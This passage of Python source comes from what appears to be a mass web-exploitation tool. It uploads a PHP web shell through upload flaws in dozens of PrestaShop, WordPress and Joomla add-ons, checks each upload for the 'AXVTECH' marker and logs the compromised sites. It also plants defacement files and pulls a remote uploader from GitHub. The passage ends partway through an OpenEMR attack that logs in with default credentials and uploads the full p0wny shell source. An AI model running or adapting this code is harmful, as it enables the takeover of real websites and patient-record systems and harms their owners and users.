        donehomepage2 = f'http://{domain}/modules/homepageadvertise2/slides/axv.php'
        eehomepage2 = requests.get(donehomepage2,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eehomepage2:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}homepageadvertise2 Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"{donehomepage2}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}homepageadvertise2 Module -->> {red}Not Vuln !")
    except:pass

    try:
        linkjro_homepage = f'https://{domain}/modules/jro_homepageadvertise/uploadimage.php'
        filenamejro_homepage = {'userfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(linkjro_homepage,files=filenamejro_homepage,headers=ua, timeout=30, verify=False)
        donejro_homepage = f'http://{domain}/modules/jro_homepageadvertise/slides/axv.php'
        eejro_homepage = requests.get(donejro_homepage,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eejro_homepage:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}jro_homepageadvertise Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"{donejro_homepage}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}jro_homepageadvertise Module -->> {red}Not Vuln !")
    except:pass

    try:
        linkmassedit = f'https://{domain}/modules/lib/redactor/file_upload.php'
        filenamemassedit = {'file': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(linkmassedit,files=filenamemassedit,headers=ua, timeout=30, verify=False)
        donemassedit = f'http://{domain}/masseditproduct/uploads/file/axv.php'
        eemassedit = requests.get(donemassedit,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eemassedit:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}lib Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"{donemassedit}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}lib Module -->> {red}Not Vuln !")
    except:pass

    try:
        linknvn_export_orders = f'https://{domain}/modules/nvn_export_orders/upload.php'
        filenamenvn_export_orders = {'images[]': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(linknvn_export_orders,files=filenamenvn_export_orders,headers=ua, timeout=30, verify=False)
        donenvn_export_orders = f'http://{domain}/modules/nvn_export_orders/axv.php'
        eenvn_export_orders = requests.get(donenvn_export_orders,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eenvn_export_orders:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}nvn_export_orders Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"{donenvn_export_orders}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}nvn_export_orders Module -->> {red}Not Vuln !")
    except:pass

    try:
        linkpk_flexmenu = f'https://{domain}/modules/pk_flexmenu/upload.php'
        filenamepk_flexmenu = {'images[]': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(linkpk_flexmenu,files=filenamepk_flexmenu,headers=ua, timeout=30, verify=False)
        donepk_flexmenu = f'http://{domain}/modules/pk_flexmenu/uploads/axv.php'
        eepk_flexmenu = requests.get(donepk_flexmenu,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eepk_flexmenu:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}pk_flexmenu Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"{donepk_flexmenu}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}pk_flexmenu Module -->> {red}Not Vuln !")
    except:pass
    
    try:
        linkproductpageadverts = f'https://{domain}/modules/productpageadverts/uploadimage.php'
        filenameproductpageadverts = {'userfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(linkproductpageadverts,files=filenameproductpageadverts,headers=ua, timeout=30, verify=False)
        doneproductpageadverts = f'http://{domain}/modules/productpageadverts/slides/axv.php'
        eeproductpageadverts = requests.get(doneproductpageadverts,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eeproductpageadverts:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}productpageadverts Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"{doneproductpageadverts}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}productpageadverts Module -->> {red}Not Vuln !")
    except:pass

    try:
        linkpsmodthemeoptionpanel = f'https://{domain}/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php'
        filenamepsmodthemeoptionpanel = {'image_upload': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(linkpsmodthemeoptionpanel,files=filenamepsmodthemeoptionpanel,headers=ua, timeout=30, verify=False)
        donepsmodthemeoptionpanel = f'http://{domain}/modules/psmodthemeoptionpanel/upload/axv.php'
        eepsmodthemeoptionpanel = requests.get(donepsmodthemeoptionpanel,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eepsmodthemeoptionpanel:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}psmodthemeoptionpanel Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"{donepsmodthemeoptionpanel}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}psmodthemeoptionpanel Module -->> {red}Not Vuln !")
    except:pass

    try:
        linksimpleslideshow = f'https://{domain}/modules/simpleslideshow/uploadimage.php'
        filenamesimpleslideshow = {'userfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(linksimpleslideshow,files=filenamesimpleslideshow,headers=ua, timeout=30, verify=False)
        donesimpleslideshow = f'http://{domain}/modules/simpleslideshow/slides/axv.php'
        eesimpleslideshow = requests.get(donesimpleslideshow,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eesimpleslideshow:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}simpleslideshow Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"{donesimpleslideshow}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}simpleslideshow Module -->> {red}Not Vuln !")
    except:pass

    try:
        linksoopabanners = f'https://{domain}/modules/soopabanners/uploadimage.php'
        filenamesoopabanners = {'userfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(linksoopabanners,files=filenamesoopabanners,headers=ua, timeout=30, verify=False)
        donesoopabanners = f'http://{domain}/modules/soopabanners/slides/axv.php'
        eesoopabanners = requests.get(donesoopabanners,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eesoopabanners:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}soopabanners Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"{donesoopabanners}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}soopabanners Module -->> {red}Not Vuln !")
    except:pass
    
    try:
        linksoopamobile = f'https://{domain}/modules/soopamobile/uploadimage.php'
        filenamesoopamobile = {'userfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(linksoopamobile,files=filenamesoopamobile,headers=ua, timeout=30, verify=False)
        donesoopamobile = f'http://{domain}/modules/soopamobile/slides/axv.php'
        eesoopamobile = requests.get(donesoopamobile,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eesoopamobile:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}soopamobile Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"{donesoopamobile}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}soopamobile Module -->> {red}Not Vuln !")
    except:pass

    try:
        linktdpsthemeoptionpanel = f'https://{domain}/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php'
        filenametdpsthemeoptionpanel = {'image_upload': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(linktdpsthemeoptionpanel,files=filenametdpsthemeoptionpanel,headers=ua, timeout=30, verify=False)
        donetdpsthemeoptionpanel = f'http://{domain}/modules/tdpsthemeoptionpanel/upload/axv.php'
        eetdpsthemeoptionpanel = requests.get(donetdpsthemeoptionpanel,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eetdpsthemeoptionpanel:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}tdpsthemeoptionpanel Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"{donetdpsthemeoptionpanel}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}tdpsthemeoptionpanel Module -->> {red}Not Vuln !")
    except:pass

    try:
        Expvideostab = f'https://{domain}/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload'
        FileDatavideostab = {'qqfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php' 'rb')}
        requests.post(Expvideostab, files=FileDatavideostab, headers=ua, timeout=30, verify=False)
        CheckShelvideostab = requests.get(f"http://{domain}/modules/videostab/uploads/axv.php", timeout=10, headers=ua, verify=False)
        if 'AXVTECH' in str(CheckShelvideostab.text):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}videostab Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/modules/videostab/uploads/axv.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}videostab Module -->> {red}Not Vuln !")
    except:pass

    try:
        linkvtermslideshow = f'https://{domain}/modules/vtermslideshow/uploadimage.php'
        filenamevtermslideshow = {'userfile': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(linkvtermslideshow,files=filenamevtermslideshow,headers=ua, timeout=30, verify=False)
        donevtermslideshow = f'http://{domain}/modules/vtermslideshow/slides/axv.php'
        eevtermslideshow = requests.get(donevtermslideshow,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eevtermslideshow:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}vtermslideshow Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"{donevtermslideshow}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}vtermslideshow Module -->> {red}Not Vuln !")
    except:pass
    
    try:
        linkwdoptionpanel = f'https://{domain}/modules/wdoptionpanel/wdoptionpanel_ajax.php'
        PostDatawdoptionpanel = {'data': 'bajatax','type': 'image_upload'}
        filenamewdoptionpanel = {'bajatax': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(linkwdoptionpanel,files=filenamewdoptionpanel,data=PostDatawdoptionpanel,headers=ua, timeout=30, verify=False)
        donewdoptionpanel = f'http://{domain}/modules/wdoptionpanel/upload/axv.php'
        eewdoptionpanel = requests.get(donewdoptionpanel,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eewdoptionpanel:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}wdoptionpanel Module -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"{donewdoptionpanel}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}wdoptionpanel Module -->> {red}Failed Exploit !")
    except:pass

    try:
        linkWpProduct = f'https://{domain}/wp-admin/admin-ajax.php'
        PostDataWpProduct = {'action': 'nm_personalizedproduct_upload_file','name': 'axvup.php'}
        filenameWpProduct = {'file': ('axv.php', open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb'),'multipart/form-data')}
        requests.post(linkWpProduct,files=filenameWpProduct,data=PostDataWpProduct,headers=ua, timeout=30, verify=False)
        doneWpProduct = f'http://{domain}/wp-content/axv.php'
        eeWpProduct = requests.get(doneWpProduct,headers=ua, timeout=10, verify=False).text
        eeWpProduct2 = requests.get(f'http://{domain}/wp-content/uploads/product_files/axvup.php',headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eeWpProduct2:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}WooCommerce Product Addons -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"{doneWpProduct}\n")
        elif 'AXVTECH' in eeWpProduct:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}WooCommerce Product Addons -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/wp-content/uploads/product_files/axvup.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}WooCommerce Product Addons -->> {red}Not Vuln !")
    except:pass

    try:
        ShellFileaddblock = {'popimg': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        Expaddblock = 'https://' + domain + '/wp-admin/admin-ajax.php?action=getcountryuser&cs=2'
        requests.post(Expaddblock, files=ShellFileaddblock, timeout=30, headers=ua, verify=False)
        CheckShelladdblock = 'http://' + domain + '/wp-content/uploads/' + tahun + '/' + bulan + '/axv.php'
        GoTaddblock = requests.get(CheckShelladdblock, timeout=10, headers=ua, verify=False)
        if GoTaddblock.status_code == 200:
            GoT2addblock = requests.get('http://' + domain + '/wp-content/axv.php', timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in GoT2addblock.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}addblockblocker -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write('http://' + domain + '/wp-content/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}addblockblocker -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}addblockblocker -->> {red}Not Vuln !")
    except:pass

    try:
        ShellFilebarclaycart = {'Filedata': ('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb'),'multipart/form-data')}
        Expbarclaycart = 'https://' + domain + '/wp-content/plugins/barclaycart/uploadify/uploadify.php'
        requests.post(Expbarclaycart, files=ShellFilebarclaycart, timeout=30, headers=ua, verify=False)
        CheckShellbarclaycart = 'http://' + domain + '/wp-content/plugins/barclaycart/uploadify/axv.php'
        GoTbarclaycart = requests.get(CheckShellbarclaycart, timeout=10, headers=ua, verify=False)
        if GoTbarclaycart.status_code == 200:
            GoT2barclaycart = requests.get('http://' + domain + '/wp-content/axv.php', timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in GoT2barclaycart.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}barclaycart Plugin -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write('http://' + domain + '/wp-content/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}barclaycart Plugin -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}barclaycart Plugin -->> {red}Not Vuln !")
    except:pass
    
    try:
        slimas = requests.post(f"https://{domain}/admin/modules/bibliography/pop_attach.php?biblioID=0", files={'file2attach': ('hacked.txt', open('worldlist/Slimass/index.txt', 'rb'))}, data={'fileTitle': 'aaa','fileDir': '../','fileURL': 'aaa','fileDesc': '','accessType': 'public','upload': 'Unggah Sekarang'}, headers={'User-Agent': UserAgent().random}, timeout=20).text
        if '403 Forbidden' not in slimas:
            cekUp = requests.get(f"http://{domain}/hacked.txt", headers=ua, timeout=5).text
            if '#011000010111100001110110' in cekUp:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}SliMass -->> {green}Uploaded Script !")
                open('results/deface.txt','a+').write(f'http://{domain}/hacked.txt\n')
            else:pass
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}SliMass -->> {red}Failed Upload Script !")
    except:pass

    try:
        requests.post(f'https://{domain}/administrator/components/com_acymailing/inc/openflash/php-ofc-library/ofc_upload_image.php?name=axv.php', data=shell, timeout=30, headers=ua, verify=False).text
        Expacymailing = requests.get('http://' + domain + '/administrator/components/com_acymailing/inc/openflash/tmp-upload-images/axv.php', headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in str(Expacymailing.text):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_acymailing -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f'http://{domain}/administrator/components/com_acymailing/inc/openflash/tmp-upload-images/axv.php\n')
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_acymailing -->> {red}Not Vuln !")
    except:pass

    try:
        requests.post(f'https://{domain}/administrator/components/com_jnewsletter/includes/openflashchart/php-ofc-library/ofc_upload_image.php?name=axv.php', data=shell, timeout=30, headers=ua, verify=False).text
        Expjnewsletter = requests.get('http://' + domain + '/administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/axv.php', headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in str(Expjnewsletter.text):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_jnewsletter -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f'http://{domain}/administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/axv.php\n')
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_jnewsletter -->> {red}Not Vuln !")
    except:pass

    try:
        requests.post(f'https://{domain}/wp-admin/admin-post.php?Legion=id&swp_debug=load_options&swp_url=https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axvuploader.php', data=shell, timeout=30, headers=ua, verify=False).text
        wprcee1 = requests.get('http://' + domain + '/wp-admin/license.php', headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in wprcee1.text:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}wp rce -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f'http://{domain}/wp-admin/license.php\n')
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}wp rce -->> {red}Not Vuln !")
    except:pass

    try:
        datacom_acym = {'option':'com_acym','ctrl':'frontmails','task':'setNewIconShare','social':'axv'}
        requests.post(f'https://{domain}', data=datacom_acym, files={"file":("axv.php", shell, "text/php")}, timeout=30, headers=ua, verify=False).text
        Expcom_acym = requests.get('http://' + domain + '/media/com_acym/upload/socials/axv.php', headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in str(Expcom_acym.text):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_acym -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f'http://{domain}/media/com_acym/upload/socials/axv.php\n')
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_acym -->> {red}Not Vuln !")
    except:pass

    try:
        requests.post(f'https://{domain}/administrator/components/com_jinc/classes/graphics/php-ofc-library/ofc_upload_image.php?name=axv.php', data=shell, timeout=30, headers=ua, verify=False).text
        Expcom_jinc = requests.get('http://' + domain + '/administrator/components/com_jinc/classes/graphics/tmp-upload-images/axv.php', headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in str(Expcom_jinc.text):
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_jinc -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f'http://{domain}/administrator/components/com_jinc/classes/graphics/tmp-upload-images/axv.php\n')
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_jinc -->> {red}Not Vuln !")
    except:pass
    
def WpEx1(domain):
    try:
        session = requests.Session()
        auth_url = f'http://{domain}:80/openemr/interface/main/main_screen.php?auth=login&site=default'
        auth_chek_url = f'http://{domain}:80/openemr/interface/login/login.php?site=default'
        response = session.get(auth_chek_url)
        
        header = {
        'Host': domain,
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://' + domain,
        'Connection': 'close',
        'Referer': auth_chek_url,
        'Upgrade-Insecure-Requests': '1',
        }

        # Body (auth):
        body = {
            'new_login_session_management': '1',
            'authProvider': 'Default',
            'authUser': 'admin',
            'clearPass': 'pass',
            'languageChoice': '1'
        }
        auth = session.post(auth_url,headers=header, data=body, timeout=20)
        # Registration preparation:
        url_reg = f'http://{domain}:80/openemr/interface/new/new_comprehensive_save.php'

        # Header (registration):
        header = {
            'Host': domain,
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'http://' + domain,
            'Connection': 'close',
            'Referer': f'http://{domain}:80/openemr/interface/new/new.php',
            'Upgrade-Insecure-Requests': '1'
        }
        body = {
        'form_cb_1': '1',
        'form_title': 'Mr.',
        'form_fname': 'AXVTECH666',
        'form_mname': '',
        'form_lname': 'AXVTECH666PASS',
        'form_pubpid': '',
        'form_DOB': '2021-05-04',
        'form_sex': 'Male',
        'form_ss': '',
        'form_drivers_license': '',
        'form_status': '',
        'form_genericname1': '',
        'form_genericval1': '',
        'form_genericname2': '',
        'form_genericval2': '',
        'form_billing_note': '',
        'form_street': '',
        'form_city': '',
        'form_state': '',
        'form_postal_code': '',
        'form_county': '',
        'form_country_code': '',
        'form_mothersname': '',
        'form_contact_relationship': '',
        'form_phone_contact': '',
        'form_phone_home': '',
        'form_phone_biz': '',
        'form_phone_cell': '',
        'form_email': '',
        'form_email_direct': '',
        'form_providerID': '',
        'form_ref_providerID': '',
        'form_pharmacy_id': '0',
        'form_hipaa_notice': '',
        'form_hipaa_voice': '',
        'form_hipaa_message': '',
        'form_hipaa_mail': '',
        'form_hipaa_allowsms': '',
        'form_hipaa_allowemail': '',
        'form_allow_imm_reg_use': '',
        'form_allow_imm_info_share': '',
        'form_allow_health_info_ex': '',
        'form_allow_patient_portal': '',
        'form_care_team': '',
        'form_cmsportal_login': '',
        'form_imm_reg_status': '',
        'form_imm_reg_stat_effdate': '',
        'form_publicity_code': '',
        'form_publ_code_eff_date': '',
        'form_protect_indicator': '',
        'form_prot_indi_effdate': '',
        'form_industry': '',
        'form_occupation': '',
        'form_em_name': '',
        'form_em_street': '',
        'form_em_city': '',
        'form_em_state': '',
        'form_em_postal_code': '',
        'form_em_country': '',
        'form_language': '',
        'form_ethnicity': '',
        'form_family_size': '',
        'form_financial_review': '',
        'form_monthly_income': '',
        'form_homeless': '',
        'form_interpretter': '',
        'form_migrantseasonal': '',
        'form_referral_source': '',
        'form_vfc': '',
        'form_religion': '',
        'form_deceased_date': '',
        'form_deceased_reason': '',
        'form_guardiansname': '',
        'form_guardianrelationship': '',
        'form_guardiansex': '',
        'form_guardianaddress': '',
        'form_guardiancity': '',
        'form_guardianstate': '',
        'form_guardianpostalcode': '',
        'form_guardiancountry': '',
        'form_guardianphone': '',
        'form_guardianworkphone': '',
        'form_guardianemail': '',
        'i1provider': '',
        'i1plan_name': '',
        'i1effective_date': '',
        'i1policy_number': '',
        'i1group_number': '',
        'i1subscriber_employer': '',
        'i1subscriber_employer_street': '',
        'i1subscriber_employer_city': '',
        'form_i1subscriber_employer_state': '',
        'i1subscriber_employer_postal_code': '',
        'form_i1subscriber_employer_country': '',
        'i1subscriber_fname': '',
        'i1subscriber_mname': '',
        'i1subscriber_lname': '',
        'form_i1subscriber_relationship': '',
        'i1subscriber_DOB': '',
        'i1subscriber_ss': '',
        'form_i1subscriber_sex': '',
        'i1subscriber_street': '',
        'i1subscriber_city': '',
        'form_i1subscriber_state': '',
        'i1subscriber_postal_code': '',
        'form_i1subscriber_country': '',
        'i1subscriber_phone': '',
        'i1copay': '',
        'i1accept_assignment': 'TRUE',
        'i2provider': '',
        'i2plan_name': '',
        'i2effective_date': '',
        'i2policy_number': '',
        'i2group_number': '',
        'i2subscriber_employer': '',
        'i2subscriber_employer_street': '',
        'i2subscriber_employer_city': '',
        'form_i2subscriber_employer_state': '',
        'i2subscriber_employer_postal_code': '',
        'form_i2subscriber_employer_country': '',
        'i2subscriber_fname': '',
        'i2subscriber_mname': '',
        'i2subscriber_lname': '',
        'form_i2subscriber_relationship': '',
        'i2subscriber_DOB': '',
        'i2subscriber_ss': '',
        'form_i2subscriber_sex': '',
        'i2subscriber_street': '',
        'i2subscriber_city': '',
        'form_i2subscriber_state': '',
        'i2subscriber_postal_code': '',
        'form_i2subscriber_country': '',
        'i2subscriber_phone': '',
        'i2copay': '',
        'i2accept_assignment': 'TRUE',
        'i3provider': '',
        'i3plan_name': '',
        'i3effective_date': '',
        'i3policy_number': '',
        'i3group_number': '',
        'i3subscriber_employer': '',
        'i3subscriber_employer_street': '',
        'i3subscriber_employer_city': '',
        'form_i3subscriber_employer_state': '',
        'i3subscriber_employer_postal_code': '',
        'form_i3subscriber_employer_country': '',
        'i3subscriber_fname': '',
        'i3subscriber_mname': '',
        'i3subscriber_lname': '',
        'form_i3subscriber_relationship': '',
        'i3subscriber_DOB': '',
        'i3subscriber_ss': '',
        'form_i3subscriber_sex': '',
        'i3subscriber_street': '',
        'i3subscriber_city': '',
        'form_i3subscriber_state': '',
        'i3subscriber_postal_code': '',
        'form_i3subscriber_country': '',
        'i3subscriber_phone': '',
        'i3copay': '',
        'i3accept_assignment': 'TRUE'}
        
        x = session.post(url_reg, headers=header, data=body, timeout=20).text
        id = x[(x.find('pid=')+4):x.find('&')]

        # Construct upload URL:
        url_upload = f'http://{domain}:80/openemr//controller.php?document&upload&patient_id=' + id + '&parent_id=1&"'

        # Header (upload):
        header = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "multipart/form-data; boundary=---------------------------370797319835249590062969815666",
            "Origin": 'http://' + domain,
            "Connection": "close",
            "Referer": url_upload,
            "Upgrade-Insecure-Requests": "1"
        }

        # Body (shell); I'm using p0wny shell: https://github.com/flozz/p0wny-shell
        body = "-----------------------------370797319835249590062969815666\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n64000000\r\n-----------------------------370797319835249590062969815666\r\nContent-Disposition: form-data; name=\"file[]\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" => $stdout,\n        \"cwd\" => getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => array('File not found / no read permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        return array(\n            'name' => basename($filePath),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => array('Invalid path / no write permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => array('Done.'),\n            'cwd' => getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: 